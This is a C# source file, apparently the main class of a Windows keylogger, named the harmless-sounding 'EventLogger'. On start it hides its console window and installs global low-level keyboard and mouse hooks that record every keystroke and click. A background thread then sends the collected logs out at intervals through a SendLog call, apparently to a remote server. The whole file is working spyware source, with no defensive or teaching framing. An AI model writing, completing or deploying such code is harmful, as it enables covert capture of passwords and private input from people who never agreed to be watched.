using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EventLogger;

class EventLogger
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static IntPtr _keyboardHook = IntPtr.Zero;
    private static IntPtr _mouseHook = IntPtr.Zero;
    private static Logger logger = new Logger();

    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Main()
    {
        var handle = GetConsoleWindow();
        // Hide
        ShowWindow(handle, 0);
        var process = Process.GetCurrentProcess();

        _keyboardHook = SetHandler(process.MainModule, (LowLevelProc) KeyBoardHandler, Constants.WH_KEYBOARD_LL);
        _mouseHook = SetHandler(process.MainModule, (LowLevelProc) MouseHandler, Constants.WH_MOUSE_LL);
        Thread thread = new Thread(new ThreadStart(ServerLogger));
        thread.Start();
        Application.Run();

        UnhookWindowsHookEx(_keyboardHook);
        UnhookWindowsHookEx(_mouseHook);

    }

    private static IntPtr SetHandler(ProcessModule? module, LowLevelProc handler, int action)
    {
        return SetWindowsHookEx(action, handler, GetModuleHandle(module.ModuleName), 0);
    }

    private static IntPtr MouseHandler(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (wParam == (IntPtr) Constants.WM_LBUTTONDOWN)
        {
            logger.MouseLog("[ML]"); // ML = Mouse Left
        }
        else if (wParam == (IntPtr) Constants.WM_RBUTTONDOWN)
        {
            logger.MouseLog("[MR]"); // MR = Mouse Right
        }

        return CallNextHookEx(_mouseHook, nCode, wParam, lParam);
    }

    private static IntPtr KeyBoardHandler(int nCode, IntPtr wParam, IntPtr lParam)
    {
        //Keyboard event
        if (wParam == (IntPtr) Constants.WM_KEYDOWN || wParam != (IntPtr) Constants.WM_KEYUP)
        {
            String key = ((Keys) Marshal.ReadInt32(lParam)).ToString();
            if (key.Length != 1)
            {
                key = "[" + key + "]";
            }
            logger.KeyLog(key);
        }

        return CallNextHookEx(_keyboardHook, nCode, wParam, lParam);
    }

    public static void ServerLogger()
    {
        try
        {
            Thread.Sleep(Constants.API_INVOKE);
            while (true)
            {
                Thread.Sleep(Constants.API_INVOKE);
                logger.SendLog();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex);
        }
    }
}